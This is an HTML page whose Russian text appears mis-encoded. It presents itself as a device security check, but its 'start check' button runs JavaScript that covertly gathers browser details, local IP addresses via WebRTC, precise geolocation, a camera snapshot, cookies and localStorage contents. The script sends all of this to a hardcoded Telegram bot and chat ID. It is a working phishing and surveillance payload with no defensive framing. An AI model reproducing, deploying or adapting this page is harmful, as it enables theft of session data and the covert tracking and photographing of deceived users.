<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            text-align: center;
            padding: 40px;
        }
        h2 {
            color: #2c3e50;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #2ecc71;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover {
            background-color: #27ae60;
        }
    </style>
</head>
<body>
    <h2>üì± –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–∞—à–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞</h2>
    <p>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.</p>
    <button onclick="startCollection()">üü¢ –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É</button>

    <script>
        const TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0";
        const TELEGRAM_CHAT_ID = "5024505351";

        function sendData(message) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,  {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(err => {
                console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", err);
                document.body.innerHTML += "<p style='color:red;'>‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∏ —Ç–æ–∫–µ–Ω.</p>";
            });
        }

        function sendFile(blob, caption = "") {
            const formData = new FormData();
            const file = new File([blob], "screenshot.jpg", { type: "image/jpeg" });

            formData.append("document", file);
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("caption", caption);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,  {
                method: 'POST',
                body: formData
            }).catch(err => {
                console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞:", err);
                document.body.innerHTML += "<p style='color:red;'>‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª.</p>";
            });
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                language: navigator.language || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                cookiesEnabled: navigator.cookieEnabled,
                online: navigator.onLine,
                timestamp: new Date().toISOString()
            };
        }

        function requestGeolocation() {
            if (!navigator.geolocation) {
                sendData("‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                return;
            }

            navigator.geolocation.getCurrentPosition(position => {
                const coords = position.coords;
                sendData(`<b>üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:</b>\n<pre>–®–∏—Ä–æ—Ç–∞: ${coords.latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${coords.longitude}</pre>`);
            }, error => {
                sendData("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é");
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }

        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    sendData("üé• –ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞");

                    // –°–æ–∑–¥–∞–µ–º –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // –†–∏—Å—É–µ–º –∫–∞–¥—Ä –Ω–∞ canvas
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫
                    stream.getTracks().forEach(track => track.stop());

                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–∞–∫ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                    canvas.toBlob(blob => {
                        sendFile(blob, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å –∫–∞–º–µ—Ä—ã");
                    }, "image/jpeg", 0.8);
                })
                .catch(err => {
                    sendData(`‚ùå –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ: <code>${err.message}</code>`);
                });
        }

        function getLocalIPs() {
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ips = [];

            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

            if (!RTCPeerConnection) {
                sendData("‚ùå WebRTC –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ —ç—Ç–æ–º –±—Ä–∞—É–∑–µ—Ä–µ");
                return;
            }

            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

            pc.onicecandidate = function(e) {
                if (!e.candidate) {
                    if (ips.length === 0) {
                        sendData("üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
                    } else {
                        sendData(`<b>üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP:</b>\n<pre>${ips.join('\\n')}</pre>`);
                    }
                    pc.close();
                    return;
                }

                const ipMatch = e.candidate.candidate.match(ipRegex);
                if (ipMatch && !ips.includes(ipMatch[1])) {
                    ips.push(ipMatch[1]);
                }
            };

            setTimeout(() => {
                pc.close();
            }, 2000);
        }

        function sendCookiesAndStorage() {
            const cookieData = document.cookie;
            if (cookieData) {
                sendData(`<b>üç™ Cookies:</b>\n<code>${cookieData}</code>`);
            } else {
                sendData("üö´ –ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö cookies");
            }

            let storageData = "";
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storageData += `${key}: ${localStorage.getItem(key)}\n`;
            }
            if (storageData) {
                sendData(`<b>üì¶ LocalStorage:</b>\n<code>${storageData}</code>`);
            }
        }

        function startCollection() {
            const deviceInfo = getDeviceInfo();
            sendData(`<b>üì≤ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);

            getLocalIPs();
            requestGeolocation();
            requestCameraAccess();
            sendCookiesAndStorage();
        }
    </script>
</body>
</html>
